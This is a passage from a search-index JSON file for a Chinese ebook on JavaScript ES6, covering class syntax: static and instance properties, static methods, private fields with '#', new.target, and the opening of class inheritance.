42;\n\n  constructor() {\n    console.log(MyClass.myStaticProp); // 42\n  }\n}\n</code></pre> <p>\u8fd9\u4e2a\u65b0\u5199\u6cd5\u5927\u5927\u65b9\u4fbf\u4e86\u9759\u6001\u5c5e\u6027\u7684\u8868\u8fbe\u3002</p> <pre><code>// \u8001\u5199\u6cd5\nclass Foo {\n  // ...\n}\nFoo.prop = 1;\n\n// \u65b0\u5199\u6cd5\nclass Foo {\n  static prop = 1;\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8001\u5199\u6cd5\u7684\u9759\u6001\u5c5e\u6027\u5b9a\u4e49\u5728\u7c7b\u7684\u5916\u90e8\u3002\u6574\u4e2a\u7c7b\u751f\u6210\u4ee5\u540e\uff0c\u518d\u751f\u6210\u9759\u6001\u5c5e\u6027\u3002\u8fd9\u6837\u8ba9\u4eba\u5f88\u5bb9\u6613\u5ffd\u7565\u8fd9\u4e2a\u9759\u6001\u5c5e\u6027\uff0c\u4e5f\u4e0d\u7b26\u5408\u76f8\u5173\u4ee3\u7801\u5e94\u8be5\u653e\u5728\u4e00\u8d77\u7684\u4ee3\u7801\u7ec4\u7ec7\u539f\u5219\u3002\u53e6\u5916\uff0c\u65b0\u5199\u6cd5\u662f\u663e\u5f0f\u58f0\u660e\uff08declarative\uff09\uff0c\u800c\u4e0d\u662f\u8d4b\u503c\u5904\u7406\uff0c\u8bed\u4e49\u66f4\u597d\u3002</p>"},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#_7","title":"\u5b9e\u4f8b\u5c5e\u6027","text":"<p>\u5b9e\u4f8b\u5c5e\u6027\u9664\u4e86\u5b9a\u4e49\u5728<code>constructor()</code>\u65b9\u6cd5\u91cc\u9762\u7684<code>this</code>\u4e0a\u9762\uff0c\u4e5f\u53ef\u4ee5\u5b9a\u4e49\u5728\u7c7b\u7684\u6700\u9876\u5c42\u3002</p> <pre><code>class IncreasingCounter {\n  constructor() {\n    this._count = 0;\n  }\n  get value() {\n    return this._count;\n  }\n  increment() {\n    this._count++;\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9e\u4f8b\u5c5e\u6027<code>this._count</code>\u5b9a\u4e49\u5728<code>constructor()</code>\u65b9\u6cd5\u91cc\u9762\u3002\u53e6\u4e00\u79cd\u5199\u6cd5\u662f\uff0c\u8fd9\u4e2a\u5c5e\u6027\u4e5f\u53ef\u4ee5\u5b9a\u4e49\u5728\u7c7b\u7684\u6700\u9876\u5c42\uff0c\u5176\u4ed6\u90fd\u4e0d\u53d8\u3002</p> <pre><code>class IncreasingCounter {\n  _count = 0;\n  get value() {\n    return this._count;\n  }\n  increment() {\n    this._count++;\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9e\u4f8b\u5c5e\u6027<code>_count</code>\u4e0e\u53d6\u503c\u51fd\u6570<code>value()</code>\u548c<code>increment()</code>\u65b9\u6cd5\uff0c\u5904\u4e8e\u540c\u4e00\u4e2a\u5c42\u7ea7\u3002\u8fd9\u65f6\uff0c\u4e0d\u9700\u8981\u5728\u5b9e\u4f8b\u5c5e\u6027\u524d\u9762\u52a0\u4e0a<code>this</code>\u3002</p> <p>\u8fd9\u79cd\u65b0\u5199\u6cd5\u7684\u597d\u5904\u662f\uff0c\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\u90fd\u5b9a\u4e49\u5728\u7c7b\u7684\u5934\u90e8\uff0c\u770b\u4e0a\u53bb\u6bd4\u8f83\u6574\u9f50\uff0c\u4e00\u773c\u5c31\u80fd\u770b\u51fa\u8fd9\u4e2a\u7c7b\u6709\u54ea\u4e9b\u5b9e\u4f8b\u5c5e\u6027\u3002</p> <pre><code>class foo {\n  bar = 'hello';\n  baz = 'world';\n\n  constructor() {\n    // ...\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u4e00\u773c\u5c31\u80fd\u770b\u51fa\uff0c<code>foo</code>\u7c7b\u6709\u4e24\u4e2a\u5b9e\u4f8b\u5c5e\u6027\uff0c\u5199\u8d77\u6765\u4e5f\u6bd4\u8f83\u7b80\u6d01\u3002</p>"},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#_8","title":"\u9759\u6001\u65b9\u6cd5","text":"<p>\u7c7b\u76f8\u5f53\u4e8e\u5b9e\u4f8b\u7684\u539f\u578b\uff0c\u6240\u6709\u5728\u7c7b\u4e2d\u5b9a\u4e49\u7684\u65b9\u6cd5\uff0c\u90fd\u4f1a\u88ab\u5b9e\u4f8b\u7ee7\u627f\u3002\u5982\u679c==\u5728\u4e00\u4e2a\u65b9\u6cd5\u524d\uff0c\u52a0\u4e0a<code>static</code>\u5173\u952e\u5b57\uff0c\u5c31\u8868\u793a\u8be5\u65b9\u6cd5\u4e0d\u4f1a\u88ab\u5b9e\u4f8b\u7ee7\u627f\uff0c\u800c\u662f\u76f4\u63a5\u901a\u8fc7\u7c7b\u6765\u8c03\u7528==\uff0c\u8fd9\u5c31\u79f0\u4e3a\u201c\u9759\u6001\u65b9\u6cd5\u201d\u3002</p> <pre><code>class Foo {\n  static classMethod() {\n    return 'hello';\n  }\n}\n\nFoo.classMethod() // 'hello'\n\nvar foo = new Foo();\nfoo.classMethod()\n// TypeError: foo.classMethod is not a function\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Foo</code>\u7c7b\u7684<code>classMethod</code>\u65b9\u6cd5\u524d\u6709<code>static</code>\u5173\u952e\u5b57\uff0c\u8868\u660e\u8be5\u65b9\u6cd5\u662f\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728<code>Foo</code>\u7c7b\u4e0a\u8c03\u7528\uff08<code>Foo.classMethod()</code>\uff09\uff0c\u800c\u4e0d\u662f\u5728<code>Foo</code>\u7c7b\u7684\u5b9e\u4f8b\u4e0a\u8c03\u7528\u3002\u5982\u679c\u5728\u5b9e\u4f8b\u4e0a\u8c03\u7528\u9759\u6001\u65b9\u6cd5\uff0c\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\uff0c\u8868\u793a\u4e0d\u5b58\u5728\u8be5\u65b9\u6cd5\u3002</p> <p>\u6ce8\u610f\uff0c\u5982\u679c\u9759\u6001\u65b9\u6cd5\u5305\u542b<code>this</code>\u5173\u952e\u5b57\uff0c\u8fd9\u4e2a<code>this</code>\u6307\u7684\u662f\u7c7b\uff0c\u800c\u4e0d\u662f\u5b9e\u4f8b\u3002</p> <pre><code>class Foo {\n  static bar() {\n    this.baz();\n  }\n  static baz() {\n    console.log('hello');\n  }\n  baz() {\n    console.log('world');\n  }\n}\n\nFoo.bar() // hello\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9759\u6001\u65b9\u6cd5<code>bar</code>\u8c03\u7528\u4e86<code>this.baz</code>\uff0c\u8fd9\u91cc\u7684<code>this</code>\u6307\u7684\u662f<code>Foo</code>\u7c7b\uff0c\u800c\u4e0d\u662f<code>Foo</code>\u7684\u5b9e\u4f8b\uff0c\u7b49\u540c\u4e8e\u8c03\u7528<code>Foo.baz</code>\u3002\u53e6\u5916\uff0c\u4ece\u8fd9\u4e2a\u4f8b\u5b50\u8fd8\u53ef\u4ee5\u770b\u51fa\uff0c\u9759\u6001\u65b9\u6cd5\u53ef\u4ee5\u4e0e\u975e\u9759\u6001\u65b9\u6cd5\u91cd\u540d\u3002</p> <p>\u7236\u7c7b\u7684\u9759\u6001\u65b9\u6cd5\uff0c\u53ef\u4ee5\u88ab\u5b50\u7c7b\u7ee7\u627f\u3002</p> <pre><code>class Foo {\n  static classMethod() {\n    return 'hello';\n  }\n}\n\nclass Bar extends Foo {\n}\n\nBar.classMethod() // 'hello'\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7236\u7c7b<code>Foo</code>\u6709\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u5b50\u7c7b<code>Bar</code>\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002</p> <p>\u9759\u6001\u65b9\u6cd5\u4e5f\u662f\u53ef\u4ee5\u4ece<code>super</code>\u5bf9\u8c61\u4e0a\u8c03\u7528\u7684\u3002</p> <pre><code>class Foo {\n  static classMethod() {\n    return 'hello';\n  }\n}\n\nclass Bar extends Foo {\n  static classMethod() {\n    return super.classMethod() + ', too';\n  }\n}\n\nBar.classMethod() // \"hello, too\"\n</code></pre>"},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#_9","title":"\u79c1\u6709\u65b9\u6cd5\u548c\u79c1\u6709\u5c5e\u6027","text":""},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#_10","title":"\u73b0\u6709\u7684\u89e3\u51b3\u65b9\u6848","text":"<p>\u79c1\u6709\u65b9\u6cd5\u548c\u79c1\u6709\u5c5e\u6027\uff0c\u662f\u53ea\u80fd\u5728\u7c7b\u7684\u5185\u90e8\u8bbf\u95ee\u7684\u65b9\u6cd5\u548c\u5c5e\u6027\uff0c\u5916\u90e8\u4e0d\u80fd\u8bbf\u95ee\u3002\u8fd9\u662f\u5e38\u89c1\u9700\u6c42\uff0c\u6709\u5229\u4e8e\u4ee3\u7801\u7684\u5c01\u88c5\uff0c\u4f46 ES6 \u4e0d\u63d0\u4f9b\uff0c\u53ea\u80fd\u901a\u8fc7\u53d8\u901a\u65b9\u6cd5\u6a21\u62df\u5b9e\u73b0\u3002</p> <p>\u4e00\u79cd\u505a\u6cd5\u662f\u5728\u547d\u540d\u4e0a\u52a0\u4ee5\u533a\u522b\u3002</p> <pre><code>class Widget {\n\n  // \u516c\u6709\u65b9\u6cd5\n  foo (baz) {\n    this._bar(baz);\n  }\n\n  // \u79c1\u6709\u65b9\u6cd5\n  _bar(baz) {\n    return this.snaf = baz;\n  }\n\n  // ...\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>_bar</code>\u65b9\u6cd5\u524d\u9762\u7684\u4e0b\u5212\u7ebf\uff0c\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u53ea\u9650\u4e8e\u5185\u90e8\u4f7f\u7528\u7684\u79c1\u6709\u65b9\u6cd5\u3002\u4f46\u662f\uff0c\u8fd9\u79cd\u547d\u540d\u662f\u4e0d\u4fdd\u9669\u7684\uff0c\u5728\u7c7b\u7684\u5916\u90e8\uff0c\u8fd8\u662f\u53ef\u4ee5\u8c03\u7528\u5230\u8fd9\u4e2a\u65b9\u6cd5\u3002</p> <p>\u53e6\u4e00\u79cd\u65b9\u6cd5\u5c31\u662f\u7d22\u6027\u5c06\u79c1\u6709\u65b9\u6cd5\u79fb\u51fa\u6a21\u5757\uff0c\u56e0\u4e3a\u6a21\u5757\u5185\u90e8\u7684\u6240\u6709\u65b9\u6cd5\u90fd\u662f\u5bf9\u5916\u53ef\u89c1\u7684\u3002</p> <pre><code>class Widget {\n  foo (baz) {\n    bar.call(this, baz);\n  }\n\n  // ...\n}\n\nfunction bar(baz) {\n  return this.snaf = baz;\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>foo</code>\u662f\u516c\u5f00\u65b9\u6cd5\uff0c\u5185\u90e8\u8c03\u7528\u4e86<code>bar.call(this, baz)</code>\u3002\u8fd9\u4f7f\u5f97<code>bar</code>\u5b9e\u9645\u4e0a\u6210\u4e3a\u4e86\u5f53\u524d\u6a21\u5757\u7684\u79c1\u6709\u65b9\u6cd5\u3002</p> <p>\u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u662f\u5229\u7528<code>Symbol</code>\u503c\u7684\u552f\u4e00\u6027\uff0c\u5c06\u79c1\u6709\u65b9\u6cd5\u7684\u540d\u5b57\u547d\u540d\u4e3a\u4e00\u4e2a<code>Symbol</code>\u503c\u3002</p> <pre><code>const bar = Symbol('bar');\nconst snaf = Symbol('snaf');\n\nexport default class myClass{\n\n  // \u516c\u6709\u65b9\u6cd5\n  foo(baz) {\n    this[bar](baz);\n  }\n\n  // \u79c1\u6709\u65b9\u6cd5\n  [bar](baz) {\n    return this[snaf] = baz;\n  }\n\n  // ...\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>bar</code>\u548c<code>snaf</code>\u90fd\u662f<code>Symbol</code>\u503c\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u65e0\u6cd5\u83b7\u53d6\u5230\u5b83\u4eec\uff0c\u56e0\u6b64\u8fbe\u5230\u4e86\u79c1\u6709\u65b9\u6cd5\u548c\u79c1\u6709\u5c5e\u6027\u7684\u6548\u679c\u3002\u4f46\u662f\u4e5f\u4e0d\u662f\u7edd\u5bf9\u4e0d\u884c\uff0c<code>Reflect.ownKeys()</code>\u4f9d\u7136\u53ef\u4ee5\u62ff\u5230\u5b83\u4eec\u3002</p> <pre><code>const inst = new myClass();\n\nReflect.ownKeys(myClass.prototype)\n// [ 'constructor', 'foo', Symbol(bar) ]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cSymbol \u503c\u7684\u5c5e\u6027\u540d\u4f9d\u7136\u53ef\u4ee5\u4ece\u7c7b\u7684\u5916\u90e8\u62ff\u5230\u3002</p>"},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#_11","title":"\u79c1\u6709\u5c5e\u6027\u7684\u63d0\u6848","text":"<p>\u76ee\u524d\uff0c\u6709\u4e00\u4e2a\u63d0\u6848\uff0c\u4e3a<code>class</code>\u52a0\u4e86\u79c1\u6709\u5c5e\u6027\u3002\u65b9\u6cd5\u662f\u5728\u5c5e\u6027\u540d\u4e4b\u524d\uff0c\u4f7f\u7528<code>#</code>\u8868\u793a\u3002</p> <pre><code>class IncreasingCounter {\n  #count = 0;\n  get value() {\n    console.log('Getting the current value!');\n    return this.#count;\n  }\n  increment() {\n    this.#count++;\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>#count</code>\u5c31\u662f\u79c1\u6709\u5c5e\u6027\uff0c\u53ea\u80fd\u5728\u7c7b\u7684\u5185\u90e8\u4f7f\u7528\uff08<code>this.#count</code>\uff09\u3002\u5982\u679c\u5728\u7c7b\u7684\u5916\u90e8\u4f7f\u7528\uff0c\u5c31\u4f1a\u62a5\u9519\u3002</p> <pre><code>const counter = new IncreasingCounter();\ncounter.#count // \u62a5\u9519\ncounter.#count = 42 // \u62a5\u9519\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5728\u7c7b\u7684\u5916\u90e8\uff0c\u8bfb\u53d6\u79c1\u6709\u5c5e\u6027\uff0c\u5c31\u4f1a\u62a5\u9519\u3002</p> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>class Point {\n  #x;\n\n  constructor(x = 0) {\n    this.#x = +x;\n  }\n\n  get x() {\n    return this.#x;\n  }\n\n  set x(value) {\n    this.#x = +value;\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>#x</code>\u5c31\u662f\u79c1\u6709\u5c5e\u6027\uff0c\u5728<code>Point</code>\u7c7b\u4e4b\u5916\u662f\u8bfb\u53d6\u4e0d\u5230\u8fd9\u4e2a\u5c5e\u6027\u7684\u3002\u7531\u4e8e\u4e95\u53f7<code>#</code>\u662f\u5c5e\u6027\u540d\u7684\u4e00\u90e8\u5206\uff0c\u4f7f\u7528\u65f6\u5fc5\u987b\u5e26\u6709<code>#</code>\u4e00\u8d77\u4f7f\u7528\uff0c\u6240\u4ee5<code>#x</code>\u548c<code>x</code>\u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u5c5e\u6027\u3002</p> <p>\u4e4b\u6240\u4ee5\u8981\u5f15\u5165\u4e00\u4e2a\u65b0\u7684\u524d\u7f00<code>#</code>\u8868\u793a\u79c1\u6709\u5c5e\u6027\uff0c\u800c\u6ca1\u6709\u91c7\u7528<code>private</code>\u5173\u952e\u5b57\uff0c\u662f\u56e0\u4e3a JavaScript \u662f\u4e00\u95e8\u52a8\u6001\u8bed\u8a00\uff0c\u6ca1\u6709\u7c7b\u578b\u58f0\u660e\uff0c\u4f7f\u7528\u72ec\u7acb\u7684\u7b26\u53f7\u4f3c\u4e4e\u662f\u552f\u4e00\u7684\u6bd4\u8f83\u65b9\u4fbf\u53ef\u9760\u7684\u65b9\u6cd5\uff0c\u80fd\u591f\u51c6\u786e\u5730\u533a\u5206\u4e00\u79cd\u5c5e\u6027\u662f\u5426\u4e3a\u79c1\u6709\u5c5e\u6027\u3002\u53e6\u5916\uff0cRuby \u8bed\u8a00\u4f7f\u7528<code>@</code>\u8868\u793a\u79c1\u6709\u5c5e\u6027\uff0cES6 \u6ca1\u6709\u7528\u8fd9\u4e2a\u7b26\u53f7\u800c\u4f7f\u7528<code>#</code>\uff0c\u662f\u56e0\u4e3a<code>@</code>\u5df2\u7ecf\u88ab\u7559\u7ed9\u4e86 Decorator\u3002</p> <p>\u8fd9\u79cd\u5199\u6cd5\u4e0d\u4ec5\u53ef\u4ee5\u5199\u79c1\u6709\u5c5e\u6027\uff0c\u8fd8\u53ef\u4ee5\u7528\u6765\u5199\u79c1\u6709\u65b9\u6cd5\u3002</p> <pre><code>class Foo {\n  #a;\n  #b;\n  constructor(a, b) {\n    this.#a = a;\n    this.#b = b;\n  }\n  #sum() {\n    return #a + #b;\n  }\n  printSum() {\n    console.log(this.#sum());\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>#sum()</code>\u5c31\u662f\u4e00\u4e2a\u79c1\u6709\u65b9\u6cd5\u3002</p> <p>\u53e6\u5916\uff0c\u79c1\u6709\u5c5e\u6027\u4e5f\u53ef\u4ee5\u8bbe\u7f6e getter \u548c setter \u65b9\u6cd5\u3002</p> <pre><code>class Counter {\n  #xValue = 0;\n\n  constructor() {\n    super();\n    // ...\n  }\n\n  get #x() { return #xValue; }\n  set #x(value) {\n    this.#xValue = value;\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>#x</code>\u662f\u4e00\u4e2a\u79c1\u6709\u5c5e\u6027\uff0c\u5b83\u7684\u8bfb\u5199\u90fd\u901a\u8fc7<code>get #x()</code>\u548c<code>set #x()</code>\u6765\u5b8c\u6210\u3002</p> <p>\u79c1\u6709\u5c5e\u6027\u4e0d\u9650\u4e8e\u4ece<code>this</code>\u5f15\u7528\uff0c\u53ea\u8981\u662f\u5728\u7c7b\u7684\u5185\u90e8\uff0c\u5b9e\u4f8b\u4e5f\u53ef\u4ee5\u5f15\u7528\u79c1\u6709\u5c5e\u6027\u3002</p> <pre><code>class Foo {\n  #privateValue = 42;\n  static getPrivateValue(foo) {\n    return foo.#privateValue;\n  }\n}\n\nFoo.getPrivateValue(new Foo()); // 42\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5141\u8bb8\u4ece\u5b9e\u4f8b<code>foo</code>\u4e0a\u9762\u5f15\u7528\u79c1\u6709\u5c5e\u6027\u3002</p> <p>\u79c1\u6709\u5c5e\u6027\u548c\u79c1\u6709\u65b9\u6cd5\u524d\u9762\uff0c\u4e5f\u53ef\u4ee5\u52a0\u4e0a<code>static</code>\u5173\u952e\u5b57\uff0c\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u9759\u6001\u7684\u79c1\u6709\u5c5e\u6027\u6216\u79c1\u6709\u65b9\u6cd5\u3002</p> <pre><code>class FakeMath {\n  static PI = 22 / 7;\n  static #totallyRandomNumber = 4;\n\n  static #computeRandomNumber() {\n    return FakeMath.#totallyRandomNumber;\n  }\n\n  static random() {\n    console.log('I heard you like random numbers\u2026')\n    return FakeMath.#computeRandomNumber();\n  }\n}\n\nFakeMath.PI // 3.142857142857143\nFakeMath.random()\n// I heard you like random numbers\u2026\n// 4\nFakeMath.#totallyRandomNumber // \u62a5\u9519\nFakeMath.#computeRandomNumber() // \u62a5\u9519\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>#totallyRandomNumber</code>\u662f\u79c1\u6709\u5c5e\u6027\uff0c<code>#computeRandomNumber()</code>\u662f\u79c1\u6709\u65b9\u6cd5\uff0c\u53ea\u80fd\u5728<code>FakeMath</code>\u8fd9\u4e2a\u7c7b\u7684\u5185\u90e8\u8c03\u7528\uff0c\u5916\u90e8\u8c03\u7528\u5c31\u4f1a\u62a5\u9519\u3002</p>"},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#newtarget","title":"new.target \u5c5e\u6027","text":"<p><code>new</code>\u662f\u4ece\u6784\u9020\u51fd\u6570\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u7684\u547d\u4ee4\u3002ES6 \u4e3a<code>new</code>\u547d\u4ee4\u5f15\u5165\u4e86\u4e00\u4e2a<code>new.target</code>\u5c5e\u6027\uff0c\u8be5\u5c5e\u6027\u4e00\u822c\u7528\u5728\u6784\u9020\u51fd\u6570\u4e4b\u4e2d\uff0c\u8fd4\u56de<code>new</code>\u547d\u4ee4\u4f5c\u7528\u4e8e\u7684\u90a3\u4e2a\u6784\u9020\u51fd\u6570\u3002\u5982\u679c\u6784\u9020\u51fd\u6570\u4e0d\u662f\u901a\u8fc7<code>new</code>\u547d\u4ee4\u6216<code>Reflect.construct()</code>\u8c03\u7528\u7684\uff0c<code>new.target</code>\u4f1a\u8fd4\u56de<code>undefined</code>\uff0c\u56e0\u6b64\u8fd9\u4e2a\u5c5e\u6027\u53ef\u4ee5\u7528\u6765\u786e\u5b9a\u6784\u9020\u51fd\u6570\u662f\u600e\u4e48\u8c03\u7528\u7684\u3002</p> <pre><code>function Person(name) {\n  if (new.target !== undefined) {\n    this.name = name;\n  } else {\n    throw new Error('\u5fc5\u987b\u4f7f\u7528 new \u547d\u4ee4\u751f\u6210\u5b9e\u4f8b');\n  }\n}\n\n// \u53e6\u4e00\u79cd\u5199\u6cd5\nfunction Person(name) {\n  if (new.target === Person) {\n    this.name = name;\n  } else {\n    throw new Error('\u5fc5\u987b\u4f7f\u7528 new \u547d\u4ee4\u751f\u6210\u5b9e\u4f8b');\n  }\n}\n\nvar person = new Person('\u5f20\u4e09'); // \u6b63\u786e\nvar notAPerson = Person.call(person, '\u5f20\u4e09');  // \u62a5\u9519\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u786e\u4fdd\u6784\u9020\u51fd\u6570\u53ea\u80fd\u901a\u8fc7<code>new</code>\u547d\u4ee4\u8c03\u7528\u3002</p> <p>Class \u5185\u90e8\u8c03\u7528<code>new.target</code>\uff0c\u8fd4\u56de\u5f53\u524d Class\u3002</p> <pre><code>class Rectangle {\n  constructor(length, width) {\n    console.log(new.target === Rectangle);\n    this.length = length;\n    this.width = width;\n  }\n}\n\nvar obj = new Rectangle(3, 4); // \u8f93\u51fa true\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5b50\u7c7b\u7ee7\u627f\u7236\u7c7b\u65f6\uff0c<code>new.target</code>\u4f1a\u8fd4\u56de\u5b50\u7c7b\u3002</p> <pre><code>class Rectangle {\n  constructor(length, width) {\n    console.log(new.target === Rectangle);\n    // ...\n  }\n}\n\nclass Square extends Rectangle {\n  constructor(length) {\n    super(length, width);\n  }\n}\n\nvar obj = new Square(3); // \u8f93\u51fa false\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>new.target</code>\u4f1a\u8fd4\u56de\u5b50\u7c7b\u3002</p> <p>\u5229\u7528\u8fd9\u4e2a\u7279\u70b9\uff0c\u53ef\u4ee5\u5199\u51fa\u4e0d\u80fd\u72ec\u7acb\u4f7f\u7528\u3001\u5fc5\u987b\u7ee7\u627f\u540e\u624d\u80fd\u4f7f\u7528\u7684\u7c7b\u3002</p> <pre><code>class Shape {\n  constructor() {\n    if (new.target === Shape) {\n      throw new Error('\u672c\u7c7b\u4e0d\u80fd\u5b9e\u4f8b\u5316');\n    }\n  }\n}\n\nclass Rectangle extends Shape {\n  constructor(length, width) {\n    super();\n    // ...\n  }\n}\n\nvar x = new Shape();  // \u62a5\u9519\nvar y = new Rectangle(3, 4);  // \u6b63\u786e\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Shape</code>\u7c7b\u4e0d\u80fd\u88ab\u5b9e\u4f8b\u5316\uff0c\u53ea\u80fd\u7528\u4e8e\u7ee7\u627f\u3002</p> <p>\u6ce8\u610f\uff0c\u5728\u51fd\u6570\u5916\u90e8\uff0c\u4f7f\u7528<code>new.target</code>\u4f1a\u62a5\u9519\u3002</p>"},{"location":"ebook-JSES6-RYF/22-Class%20%E7%9A%84%E7%BB%A7%E6%89%BF/","title":"Class \u7684\u7ee7\u627f","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 20724  \u9605\u8bfb42\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/22-Class%20%E7%9A%84%E7%BB%A7%E6%89%BF/#_1","title":"\u7b80\u4ecb","text":"<p>Class \u53ef\u4ee5\u901a\u8fc7<code>extends</code>\u5173\u952e\u5b57\u5b9e\u73b0\u7ee7\u627f\uff0c\u8fd9\u6bd4 ES5 \u7684\u901a\u8fc7\u4fee\u6539\u539f\u578b\u94fe\u5b9e\u73b0\u7ee7\u627f\uff0c\u8981\u6e05\u6670\u548c\u65b9\u4fbf\u5f88\u591a\u3002</p> <pre><code>class Point {\n}\n\nclass ColorPoint extends Point {\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5b9a\u4e49\u4e86\u4e00\u4e2a<code>ColorPoint</code>\u7c7b\uff0c\u8be5\u7c7b\u901a\u8fc7<code>extends</code>\u5173\u952e\u5b57\uff0c\u7ee7\u627f\u4e86<code>Point</code>\u7c7b\u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u4f46\u662f\u7531\u4e8e\u6ca1\u6709\u90e8\u7f72\u4efb\u4f55\u4ee3\u7801\uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a\u7c7b\u5b8c\u5168\u4e00\u6837\uff0c\u7b49\u4e8e\u590d\u5236\u4e86\u4e00\u4e2a<code>Point</code>\u7c7b\u3002\u4e0b\u9762\uff0c\u6211\u4eec\u5728<code>ColorPoint</code>\u5185\u90e8\u52a0\u4e0a\u4ee3\u7801\u3002</p> <pre><code>class ColorPoint extends Point {\n\n  constructor(x, y, color) {\n    super(x, y); // \u8c03\u7528\u7236\u7c7b\u7684constructor(x, y)\n    this.color = color;\n  }\n\n  toString() {\n    return this.color + ' ' + super.toString(); // \u8c03\u7528\u7236\u7c7b\u7684toString()\n  }\n}\n\nclass PositionPoint extends Point {\n  constructor(x, y, name) {\n    super(x, y);\n    this.name = name;\n  }\n}\n// \u8fd9\u91cc\u7684xy\u5750\u6807\uff0c\u5b50\u7c7b\u81ea\u5df1\u7684this\u5bf9\u8c61\u9700\u8981\u901a\u8fc7\u7236\u7c7b\u521b\u5efa\uff0c\u8fd9\u6837this\u5bf9\u8c61\u5177\u6709\u7236\u7c7b\u7684\u5b9e\u4f8b\u5c5e\u6027\uff08xy\u5750\u6807\uff09\u548c\u5b9e\u4f8b\u65b9\u6cd5\uff08toString\uff09\u3002\u7136\u540ethis\u5bf9\u8c61\u5728\u5b50\u7c7b\u4e2d\u52a0\u4e0a\u81ea\u5df1\u7684\u5b9e\u4f8b\u5c5e\u6027\uff08color, name\uff09\u548c\u65b9\u6cd5\uff08toString\uff09\u3002\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d==<code>super</code>\u5173\u952e\u5b57\uff0c\u5b83\u5728\u8fd9\u91cc\u8868\u793a\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u65b0\u5efa\u7236\u7c7b\u7684<code>this</code>\u5bf9\u8c61==\u3002</p> <p>\u5b50\u7c7b\u5fc5\u987b\u5728<code>constructor</code>\u65b9\u6cd5\u4e2d\u8c03\u7528<code>super</code>\u65b9\u6cd5\uff0c\u5426\u5219\u65b0\u5efa\u5b9e\u4f8b\u65f6\u4f1a\u62a5\u9519\u3002</p> 